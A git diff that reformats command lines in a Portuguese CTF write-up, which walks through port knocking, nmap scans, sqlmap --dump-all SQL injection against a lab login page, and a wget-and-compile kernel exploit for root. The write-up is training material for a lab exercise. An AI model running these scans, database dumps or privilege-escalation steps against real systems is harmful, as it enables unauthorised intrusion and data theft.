@@ -28,17 +28,17 @@ PORT     STATE SERVICE
 
 Vemos que apenas a porta `22` está abertas, bom, só com o **SSH** vamos acessa-lo para ver se nós conseguimos alguma informação e tambem porque não temos muitas opções nesse momento:
 
-##### > ssh teste@10.10.88.243
+`> ssh teste@10.10.88.243`
 
 ![image-20200730122129762](/images/image-20200730122129762.png)
 
 `Knock Friend to Enter` e `Easy as 1,2,3` é as informações que o **SSH** nós dá, no começo desse Write-up eu disse que as *tags* do CTF seriam uma dica para nós, conseguimos atrelar as informações **Bata amigo para entrar** e **fácil como 1,2,3** deduzindo que é necessário fazermos um **knocking** nas portas 1,2 e 3 em sequência. Conseguimos fazer isso facilmente com o **nmap** com as flags **-r** *(Para ele fazer o scan em sequência e não com as portas escolhidas aleatóriamente)*:
 
-##### > nmap 10.10.88.243 -p1,2,3 -r 
+`> nmap 10.10.88.243 -p1,2,3 -r`
 
 Agora vamos rodar o **nmap** para vermos se alguma porta escondida foi aberta:
 
-##### > nmap 10.10.88.243 -p- -T4 --min-rate=20000
+`> nmap 10.10.88.243 -p- -T4 --min-rate=20000`
 
 ```bash
 Not shown: 46041 filtered ports, 19492 closed ports
@@ -49,7 +49,7 @@ PORT     STATE SERVICE
 
 Vemos que a porta `1337` foi aberta! Iremos rodar um outro **nmap** com as *flags* **-sC** *(para rodar os scripts padrão do nmap)* e **-sV** (para conseguir informação sobre a versão/serviço da porta) nestas portas abertas, para conseguir mais detalhes sobre as portas escaneadas:
 
-##### > nmap 10.10.88.243 -p22,1337 -sC -sV -T4 --min-rate=20000
+`> nmap 10.10.88.243 -p22,1337 -sC -sV -T4 --min-rate=20000`
 
 ```bash
 22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
@@ -118,7 +118,7 @@ username=a&password=a&submit=+Login+
 
 A única coisa que importa para nós é a ultima linha `username=a&password=a&submit=+Login+`, a partir disso iniciei o **sqlmap** com as flags de **--data** com a requisição *POST* e o **--dump-all **para extrair todos dados se for possível extrair dados por **SQLi**:
 
-##### **> sqlmap -u 'http://10.10.88.243:1337/978345210/index.php' --data="username=a&password=a&submit=+Login+" --dump-all **
+`> sqlmap -u 'http://10.10.88.243:1337/978345210/index.php' --data="username=a&password=a&submit=+Login+" --dump-all`
 
 E tem um certo momento aonde o **sqlmap** me retorna um aviso de redirecionamento para o *path* `/978345210/profile.php` com o seguinte *warning*: 
 
@@ -128,7 +128,7 @@ got a 302 redirect to 'http://10.10.88.243:1337/978345210/profile.php'. Do you w
 
 Isso me indicaria um suposto **bypass** na autenticação do *login*, então eu resolvi redirecionar o **sqlmap** para **BURP** analisar qual foi exatamente a requisição *POST* que deu o **bypass**, usando a *flag* de **--proxy** no **sqlmap** para mandar todos os pacotes do **script** para anlisar no **burp**, rodando então: 
 
-##### > sqlmap -u 'http://10.10.88.243:1337/978345210/index.php'																			    --data="username=a&password=a&submit=+Login+"--dump-all --proxy http://127.0.0.1:8080
+`> sqlmap -u 'http://10.10.88.243:1337/978345210/index.php' --data="username=a&password=a&submit=+Login+"--dump-all --proxy http://127.0.0.1:8080`
 
 e verificando no **BURP** nós encontramos a requisição *POST* com o **bypass**.
 
@@ -142,7 +142,7 @@ Vamos jogar esse mesmo *POST* no navegador pelo **BURP** que ele retornará a p�
 
 **Sim!** **Nada interessante :(** na verdade isso é uma distração da verdadeira falha, vamos aproveitar que verificamos que existe uma falha de **SQL Injection** no sistema de login dessa aplicação e rodaremos o **sqlmap** no arquivo aonde ele faz a requisição *POST*, que na verdade é no arquivo `/978345210/login.php`:
 
-##### > sqlmap -u 'http://10.10.88.243:1337/978345210/login.php' --dump-all															 --data="username=a&password=a&submit=+Login+" --threads 7
+`> sqlmap -u 'http://10.10.88.243:1337/978345210/login.php' --dump-all															 --data="username=a&password=a&submit=+Login+" --threads 7`
 
 ```css
 Database: Webapp
@@ -182,7 +182,7 @@ Podemos verificar que a versão `3.19.0-25-generic` do **kernel** e também junt
 
 Após baixar o arquivo, vou até a pasta aonde ele está localizado pela minha máquina, e executo o **python** no diretorio para abrir um servidor local para eu baixar esse arquivo pelo acesso remoto do servidor:
 
-##### > python3 -m http.server 8001 --bind 10.9.45.65
+`> python3 -m http.server 8001 --bind 10.9.45.65`
 
 E pela máquina do servidor que eu tenho a *shell* eu faço os seguintes passos: vou até a *home* do usuario, uso o **wget** para baixar o exploit em C, então uso **GCC** para compilar o exploit e simplesmente rodo ele conseguindo o usuario de root!
 
